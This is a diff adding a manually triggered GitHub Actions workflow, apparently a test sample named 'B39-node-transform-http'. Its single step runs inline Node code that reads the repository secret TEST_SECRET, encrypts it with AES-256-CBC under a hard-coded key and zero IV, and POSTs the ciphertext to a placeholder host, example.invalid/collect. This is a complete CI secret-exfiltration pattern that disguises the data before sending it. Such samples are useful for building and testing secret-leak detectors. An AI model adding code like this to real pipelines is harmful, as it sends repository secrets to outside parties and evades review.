@@ -1,0 +1,42 @@
+name: B39-node-transform-http
+
+on:
+  workflow_dispatch:
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    env:
+      SECRET: "${{ secrets.TEST_SECRET }}"
+
+    steps:
+      - run: |
+          node -e '
+            const crypto = require("crypto");
+
+            const key = crypto
+              .createHash("sha256")
+              .update("example-key")
+              .digest();
+
+            const iv = Buffer.alloc(16, 0);
+
+            const cipher = crypto.createCipheriv(
+              "aes-256-cbc",
+              key,
+              iv
+            );
+
+            let encrypted = cipher.update(
+              process.env.SECRET,
+              "utf8",
+              "hex"
+            );
+
+            encrypted += cipher.final("hex");
+
+            fetch("https://example.invalid/collect", {
+              method: "POST",
+              body: encrypted
+            });
+          '
